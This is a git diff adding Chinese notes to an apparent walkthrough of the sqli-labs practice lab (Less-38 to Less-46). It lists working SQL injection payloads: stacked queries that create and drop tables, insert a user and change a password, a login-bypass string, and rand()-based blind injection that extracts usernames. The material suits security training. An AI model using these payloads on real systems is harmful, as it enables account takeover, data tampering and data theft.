@@ -1102,3 +1102,74 @@ mysql在使用GBK编码时,会认为两个字符为一个汉字,例如`%c4%e3`�
 
 ### Less-38
 
+闭合方式为`'`
+
+传入`?id=-1' or 1=1;create table wdnmd like uesrs;%23`创建新表
+
+传入`?id=-1' or 1=1;drop table wdnmd;%23`删除表
+
+![](屏幕截图%202021-11-03%20085026.png)
+
+传入`?id=-1' or 1=1;insert into users(id,username,password) values(100,'wdnmd','wdnmd');%23`新建用户
+
+![](屏幕截图%202021-11-03%20085514.png)
+
+### Less-39
+
+不需要进行闭合,其余步骤同上
+
+### Less-40
+
+闭合方式为`')`,其余步骤同上
+
+### Less-41
+
+同Less-39
+
+### Less-42
+
+1. 同Less-24的二次注入
+
+2. 在password中传入`123'`返回报错信息,password的闭合方式为`'`
+
+在password处填入`1' or 1#`使用万能密码登录
+
+在password处填入`123' or 1=1;insert into users(id,username,password) values(100,'wdnmd','wdnmd');#`新建用户
+
+在password处填入`123' or 1=1;update users set password='asdf' where username='wdnmd';#`修改用户密码
+
+![](屏幕截图%202021-11-03%20093411.png)
+
+### Less-43
+
+password的闭合方式为`')`,其余步骤同上
+
+### Less-44
+
+password的闭合方式为`'`,但是在测试闭合方式时没有报错信息,其余步骤同上
+
+### Less-45
+
+password的闭合方式为`')`,但是在测试闭合方式时没有报错信息,其余步骤同上
+
+### Less-46
+
+`order by`注入
+
+
+
+
+1. 利用`rand`进行盲注
+
+`select * from users order by rand(0);`
+
+![](屏幕截图%202021-11-03%20095858.png)
+
+`select * from users order by rand(1);`
+
+![](屏幕截图%202021-11-03%20095932.png)
+
+例如`select * from users order by rand(length(database())=8);`可以根据回显数据排序的方式的不同来判断`database`名称的长度
+
+`select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))<50);`二分法确定名字
+
